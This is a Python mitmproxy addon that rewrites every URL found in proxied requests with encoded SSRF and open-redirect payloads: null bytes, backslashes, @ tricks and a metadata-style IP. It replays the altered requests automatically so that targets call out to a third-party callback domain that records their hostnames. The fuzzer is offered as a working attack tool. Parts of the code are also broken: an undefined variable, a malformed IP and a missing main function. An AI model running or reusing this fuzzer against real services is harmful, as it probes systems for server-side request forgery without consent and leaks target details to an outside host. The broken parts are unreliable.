import re
import sys
import urllib.parse
from itertools import chain, combinations
import csv
import subprocess
import hashlib
from typing import BinaryIO
import logging
import base64
#import aiohttp
import asyncio

"""Take incoming HTTP requests and replay them with modified parameters."""
from mitmproxy import ctx, io, http

base_payloads = [
"aHR0cHM6Ly9uLnByAI5hYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByACVhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByAAxhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByIwNhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByANVhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByCWFhLXZlcjQ1LmNvLnVrL2EvYi5jP2E9MSZiPTMsNCNmcmFn",
"aHR0cHM6Ly9uLnByIyZhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByAC1hYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByAExhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByIwdhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByI3ZhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByL0BhYS12ZXI0NS5jby51ay9hL2IuYz9hPTEmYj0zLDQjZnJhZw==",
"aHR0cHM6Ly9uLnByI2FhLXZlcjQ1LmNvLnVrL2EvYi5jP2E9MSZiPTMsNCNmcmFn",
]

single_domain_payloads = [
"aHR0cHM6bi5wcg==",
"aHR0cHM6L24ucHI=",
"aHR0cDovXC9cbi5wcg==",
"aHR0cHM6L1xuLnBy",
"Ly9uLnBy",
"XC9cL24ucHIv",
"L1wvbi5wci8=",
"L24ucHI=",
"JTBEJTBBL24ucHI=",
"I24ucHI=",
"IyUyMEBuLnBy",
"QG4ucHI=",
"aHR0cDovLzE2OS4yNTQuMTY5OC4yNTRcQG4ucHI=",
"biUwMC5wcg==",
"biVFMyU4MCU4MnBy",
"buOAgnBy",
]

class Writer:
    def __init__(self, path: str) -> None:
        self.f: BinaryIO = open(path, "wb")
        self.w = io.FlowWriter(self.f)

    def done(self):
        self.f.close()

    async def request( self, flow: http.HTTPFlow ) -> None:
        # Avoid an infinite loop by not replaying already replayed requests
        if flow.is_replay == "request":
            return
        flow_copy = flow.copy()
        url_for_payloads = search_for_url(flow_copy)
        if url_for_payloads:
            #logging.warning(url_for_payloads)
            for pl in base_payloads:
                await replay_modified_payload( flow_copy , url_for_payloads, pl, self.w )
            for pl in single_domain_payloads:
                await replay_single_domain_payload( flow_copy , url_for_payloads, pl, self.w )

def search_for_url(flow):
    # Define the regular expression pattern for a URL
    url_pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
    request_headers = flow.request.headers.fields
    request_content = urllib.parse.unquote(flow.request.content)
    
    # Try to find all URLs within the request headers and content
    content_matches = re.findall(url_pattern, request_content)
    header_matches = []
    for header in request_headers:
        #header[1] is presumed to be the header value, header[0] the header name
        this_matches = re.findall(url_pattern, urllib.parse.unquote(header[1]))
        if this_matches:
            header_matches.extend(this_matches)
            
    matches = []
    
    if content_matches:
        modified_content = request_content
        matches.extend(content_matches)
    if header_matches:
        modified_headers = request_headers
        matches.extend(header_matches)
        for match in matches:
            url_expr = match
            for char in url_expr:
                if char in ['"','}']:
                    url_expr = url_expr.replace(char, ' ')
            extracted_url = url_expr.split()[0]
            print(f"extracted_url: {extracted_url}")
           
            # Extract all parameters from the parameters string
            url_dict = dict()
            parsed_url_tuple = urllib.parse.urlparse(extracted_url)

            parsed_url_tuple_dict = parsed_url_tuple._asdict()
            for key in parsed_url_tuple_dict.keys():
                url_dict[key] = parsed_url_tuple_dict[key] 
            
            if parsed_url_tuple.scheme:
                url_dict['scheme'] = parsed_url_tuple.scheme 
            else:
                url_dict['scheme'] = ""
            if parsed_url_tuple.netloc:
                url_dict['netloc'] = parsed_url_tuple.netloc 
            else:
                url_dict['netloc'] = ""
            if parsed_url_tuple.username:
                url_dict['username'] = parsed_url_tuple.username 
            else:
                url_dict['username'] = ""
            if parsed_url_tuple.path:
                url_dict['path'] = parsed_url_tuple.path 
            else:
                url_dict['path'] = ""
            if parsed_url_tuple.params:
                url_dict['params'] = parsed_url_tuple.params 
            else:
                url_dict['params'] = ""
            if parsed_url_tuple.query:
                url_dict['query'] = parsed_url_tuple.query 
            else:
                url_dict['query'] = ""
            if parsed_url_tuple.fragment:
                url_dict['fragment'] = parsed_url_tuple.fragment 
            else:
                url_dict['fragment'] = ""
            if parsed_url_tuple.password:
                url_dict['password'] = parsed_url_tuple.password 
            else:
                url_dict['password'] = ""
            if parsed_url_tuple.hostname:
                url_dict['hostname'] = parsed_url_tuple.hostname 
            else:
                url_dict['hostname'] = ""
            if parsed_url_tuple.port:
                url_dict['port'] = parsed_url_tuple.port 
            else:
                url_dict['port'] = ""


            url_literal = r"{}".format(extracted_url)
            param_pattern = r'([^&=]+)=([^&]*)'
            params = re.findall(param_pattern, url_dict['query'])
            params_dict = {}
            for p in params:
                params_dict[p[0].lstrip('?')] = p[1]
            url_dict['params_dict'] = params_dict

            url_bytes = bytes(url_literal, 'utf-8')
            if content_matches:
                modified_content = modified_content.replace(url_literal, "URLFUZZ")
            if header_matches:
                tmp_headers = []
                for header in modified_headers:
                    inner_tmp = []
                    inner_tmp.append(header[0])
                    if header[0] != b"Host":
                        inner_tmp.append(header[1].replace(bytes(url_literal,'utf-8'), b"URLFUZZ"))
                    else:
                        inner_tmp.append(header[1])
                    tmp_headers.append(inner_tmp)
                modified_headers = tmp_headers
        if content_matches:
            url_dict['modified_content'] = bytes(modified_content, 'utf-8')
        if header_matches:
            url_dict['modified_headers'] = modified_headers

        return url_dict
    else:
        # If the input doesn't contain a URL, return None
        return None

async def replay_modified_payload( flow: http.HTTPFlow , url_for_payloads, pl , plug_writer: io.FlowWriter ) -> None:
        
        try:
            flow_copy = flow.copy()
            plug_writer.add(flow_copy)
            dpl = base64.b64decode(pl)
            this_telequery = f"{url_for_payloads['netloc']}.urlfuzz.telescopiceye.mooo.com/?urlfuzz={url_for_payloads['netloc']}{url_for_payloads['path']}"
            byte_query = bytes(this_telequery,'utf-8')
            new_pl = dpl.replace(b"n.pr", bytes( url_for_payloads['netloc'], 'utf-8' ))
            new_pl = new_pl.replace(b"aa-ver45.co.uk",byte_query)
            other_pl = dpl.replace(b"aa-ver45.co.uk", bytes( url_for_payloads['netloc'], 'utf-8' ))
            other_pl = other_pl.replace(b"n.pr", byte_query)
            if 'modified_content' in url_for_payloads.keys():
                this_content_a = url_for_payloads['modified_content'].replace(b"URLFUZZ",new_pl)
                this_content_b = url_for_payloads['modified_content'].replace(b"URLFUZZ",other_pl)
            if 'modified_headers' in url_for_payloads.keys():
                this_headers_a = []
                this_headers_b = []
                for hdr in url_for_payloads['modified_headers']:
                    this_headers_a.append(( hdr[0], hdr[1].replace(b"URLFUZZ",new_pl)))
                    this_headers_b.append(( hdr[0], hdr[1].replace(b"URLFUZZ",other_pl)))
            if 'modified_content' in url_for_payloads.keys():
                flow_copy.request.content = this_content_a
            if 'modified_headers' in url_for_payloads.keys():
                flow_copy.request.headers = http.Headers(this_headers_a)
            if "view" in ctx.master.addons:
                ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
            ctx.master.commands.call("replay.client", [flow_copy])
            flow_copy = flow.copy()
            if 'modified_content' in url_for_payloads.keys():
                flow_copy.request.content = this_content_b
            if 'modified_headers' in url_for_payloads.keys():
                flow_copy.request.headers = http.Headers(this_headers_b)
            if "view" in ctx.master.addons:
                ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
            ctx.master.commands.call("replay.client", [flow_copy])
        except Exception as e:
            logging.info(e)



async def replay_single_domain_payload( flow: http.HTTPFlow , url_for_payloads, pl , plug_writer: io.FlowWriter ) -> None:

    try:
        flow_copy = flow.copy()
        plug_writer.add(flow_copy)
        dpl = base64.b64decode(pl)
        this_telequery = f"{url_for_payloads['netloc']}.urlfuzz.telescopiceye.mooo.com/?urlfuzz={url_for_payloads['netloc']}{url_for_payloads['path']}"
        byte_query = bytes(this_telequery,'utf-8')
        other_pl = dpl.replace(b"n.pr", byte_query)
        if 'modified_content' in url_for_payloads.keys():
            this_content_b = url_for_payloads['modified_content'].replace(b"URLFUZZ",other_pl)
        if 'modified_headers' in url_for_payloads.keys():
            this_headers_b = []
            for hdr in url_for_payloads['modified_headers']:
                this_headers_b.append(( hdr[0], hdr[1].replace(b"URLFUZZ",other_pl))).strip("\n")
        if 'modified_content' in url_for_payloads.keys():
            flow_copy.request.content = this_content_a
        if 'modified_headers' in url_for_payloads.keys():
            flow_copy.request.headers = http.Headers(this_headers_b)
        if "view" in ctx.master.addons:
            ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
        ctx.master.commands.call("replay.client", [flow_copy])
    except Exception as e:
        logging.info(e)

def make_filename_from_path( netloc , path ):
    replaced_netloc = netloc.replace(".","-")
    replaced_path = hashlib.md5(path.replace("/","_").encode('utf-8')).hexdigest()
    return f"{replaced_netloc}_{replaced_path}"


addons = [Writer("test.writer")]

if __name__=='__main__':
    main()
